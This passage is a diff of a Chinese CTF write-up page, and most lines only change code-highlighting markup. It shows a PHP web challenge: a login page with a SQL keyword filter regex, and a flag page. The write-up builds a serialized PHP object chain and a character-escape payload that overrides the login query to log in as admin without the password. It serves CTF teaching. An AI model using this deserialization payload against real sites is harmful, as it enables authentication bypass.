+        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'s'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$idResult</span><span class="token punctuation">,</span> <span class="token variable">$passwordResult</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token variable">$idResult</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$idResult</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token single-quoted-string string">'用户不存在!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token variable">$passwordResult</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token single-quoted-string string">'密码错误！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'token'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token variable">$idResult</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token comment">//还没来得及写</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></span></code></pre></code></pre>
 <p><code>login.php</code>      </p>
-<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib.php&#x27;</span>);
-<span class="hljs-meta">?&gt;</span>
-&lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt; 
-&lt;title&gt;login&lt;/title&gt;
-&lt;center&gt;
-	&lt;form action=<span class="hljs-string">&quot;login.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> style=<span class="hljs-string">&quot;margin-top: 300&quot;</span>&gt;
-		&lt;h2&gt;百万前端的用户信息管理系统&lt;/h2&gt;
-		&lt;h3&gt;半成品系统 留后门的程序员已经跑路&lt;/h3&gt;
-        		&lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;username&quot;</span> placeholder=<span class="hljs-string">&quot;UserName&quot;</span> required&gt;
-		&lt;br&gt;
-		&lt;input type=<span class="hljs-string">&quot;password&quot;</span> style=<span class="hljs-string">&quot;margin-top: 20&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span> placeholder=<span class="hljs-string">&quot;password&quot;</span> required&gt;
-		&lt;br&gt;
-		&lt;button style=<span class="hljs-string">&quot;margin-top:20;&quot;</span> type=<span class="hljs-string">&quot;submit&quot;</span>&gt;登录&lt;/button&gt;
-		&lt;br&gt;
-		&lt;img src=<span class="hljs-string">&#x27;img/1.jpg&#x27;</span>&gt;大家记得做好防护&lt;/img&gt;
-		&lt;br&gt;
-		&lt;br&gt;
-<span class="hljs-meta">&lt;?php</span> 
-$user=<span class="hljs-keyword">new</span> user();
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;
-	<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, $_POST[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;
-		<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br&gt;Damn you, hacker!&quot;</span>);
-	&#125;
-	<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, $_POST[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;
-		<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Damn you, hacker!&quot;</span>);
-	&#125;
-	$user-&gt;login();
-&#125;
-<span class="hljs-meta">?&gt;</span>
-	&lt;/form&gt;
-&lt;/center&gt;</code></pre></code></pre>
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'lib.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span> 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">margin-top</span><span class="token punctuation">:</span> 300</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>百万前端的用户信息管理系统<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>半成品系统 留后门的程序员已经跑路<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span>
+        		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UserName<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">margin-top</span><span class="token punctuation">:</span> 20</span><span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">margin-top</span><span class="token punctuation">:</span>20<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>img/1.jpg<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>大家记得做好防护<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>img</span><span class="token punctuation">></span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+<span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"&lt;br>Damn you, hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Damn you, hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></code></pre></code></pre>
 <p><code>update.php</code>       </p>
-<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib.php&#x27;</span>);
-<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;html&gt;</span>
-<span class="hljs-string">&lt;meta charset=&quot;utf-8&quot;&gt;</span>
-<span class="hljs-string">&lt;title&gt;update&lt;/title&gt;</span>
-<span class="hljs-string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span>
-<span class="hljs-string">&lt;/html&gt;&#x27;</span>;
-<span class="hljs-keyword">if</span> ($_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>]!=<span class="hljs-number">1</span>)&#123;
-	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你还没有登陆呢！&quot;</span>;
-&#125;
-$users=<span class="hljs-keyword">new</span> User();
-$users-&gt;update();
-<span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>]===<span class="hljs-number">1</span>)&#123;
-	<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);
-	<span class="hljs-keyword">echo</span> $flag;
-&#125;
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'lib.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;html>
+&lt;meta charset="utf-8">
+&lt;title>update&lt;/title>
+&lt;h2>这是一个未完成的页面，上线时建议删除本页面&lt;/h2>
+&lt;/html>'</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+	<span class="token keyword">echo</span> <span class="token double-quoted-string string">"你还没有登陆呢！"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$users</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$users</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+	<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
 
-<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
+<span class="token delimiter important">?></span></span></code></pre></code></pre>
 <p>这个网站的逻辑就是要以admin登录，通过SQL语句查询，比较ID和passwd，正确的话，跳转到<code>update.php</code>，得到flag    </p>
 <p>主要是<code>lib.php</code>     </p>
 <pre><code>function safe($parm)
@@ -504,45 +504,45 @@ $users-&gt;update();        </code></pre>
 <pre><code>$_SESSION[&#39;token&#39;] = $this-&gt;name;
         return $idResult;      </code></pre>
 <p>重新登陆时不管密码是什么都能登陆成功，得到flag了     </p>
-<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UpdateHelper</span></span>
-<span class="hljs-class"></span>&#123;
-    <span class="hljs-keyword">public</span> $sql;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
-<span class="hljs-function">    </span>&#123;
-        <span class="hljs-keyword">$this</span>-&gt;sql=<span class="hljs-keyword">new</span> User();
-    &#125;
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">UpdateHelper</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sql</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-&#125;
+<span class="token punctuation">&#125;</span>
 
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>
-<span class="hljs-class"></span>&#123;
-    <span class="hljs-keyword">public</span> $age;
-    <span class="hljs-keyword">public</span> $nickname;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
-<span class="hljs-function">    </span>&#123;
+<span class="token keyword">class</span> <span class="token class-name">User</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
         
-        <span class="hljs-keyword">$this</span>-&gt;age=<span class="hljs-string">&#x27;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;</span>;
-        <span class="hljs-keyword">$this</span>-&gt;nickname=<span class="hljs-keyword">new</span> Info();
-    &#125;
-&#125;
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token operator">=</span><span class="token single-quoted-string string">'select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?'</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span>
-<span class="hljs-class"></span>&#123;
-    <span class="hljs-keyword">public</span> $CtrlCase;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
-<span class="hljs-function">    </span>&#123;
-        <span class="hljs-keyword">$this</span>-&gt;CtrlCase=<span class="hljs-keyword">new</span> dbCtrl();
-    &#125;
-&#125;
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dbCtrl</span></span>
-<span class="hljs-class"></span>&#123;
-    <span class="hljs-keyword">public</span> $name=<span class="hljs-string">&#x27;admin&#x27;</span>;
-    <span class="hljs-keyword">public</span> $password=<span class="hljs-string">&#x27;1&#x27;</span>;
-&#125;
+<span class="token keyword">class</span> <span class="token class-name">Info</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">CtrlCase</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name">dbCtrl</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token single-quoted-string string">'1'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
 
-$a=<span class="hljs-keyword">new</span> UpdateHelper();
-<span class="hljs-keyword">echo</span> serialize($a);</code></pre></code></pre>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre></code></pre>
 <p>结果为</p>
 <pre><code>O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; 
 from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;      </code></pre>
@@ -551,15 +551,15 @@ from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1
 <pre><code>return safe(serialize(new Info($age, $nickname)));     </code></pre>
 <p>这里序列化的是一个新类，这样的话，刚才得到的payload只会被视为一个长的字符串，并不会被反序列化       </p>
 <p>所以要字符逃逸       </p>
-<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span>
-<span class="hljs-class"></span>&#123;
-    <span class="hljs-keyword">public</span> $age=<span class="hljs-number">1</span>;
-    <span class="hljs-keyword">public</span> $nickname=<span class="hljs-string">&#x27;123&#x27;</span>;
-    <span class="hljs-keyword">public</span> $CtrlCase=<span class="hljs-number">123</span>;
-&#125;
-$a=<span class="hljs-keyword">new</span> Info();
-<span class="hljs-keyword">echo</span> serialize($a);</code></pre></code></pre>
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">Info</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token single-quoted-string string">'123'</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token operator">=</span><span class="token number">123</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </span></code></pre></code></pre>
 <p>输出：<code>O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;i:1;s:8:&quot;nickname&quot;;s:3:&quot;123&quot;;s:8:&quot;CtrlCase&quot;;i:123;&#125;</code>       </p>
 <p>要想逃逸，需要再刚才的payload前加上<code>&quot;;s:8:&quot;CtrlCase&quot;;</code>（<code>&quot;</code>来闭合序列化后生成的<code>&quot;</code>）后面加上<code>&#125;</code>来提前结束反序列化     </p>
 <p>payload:<code>&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;</code>      </p>
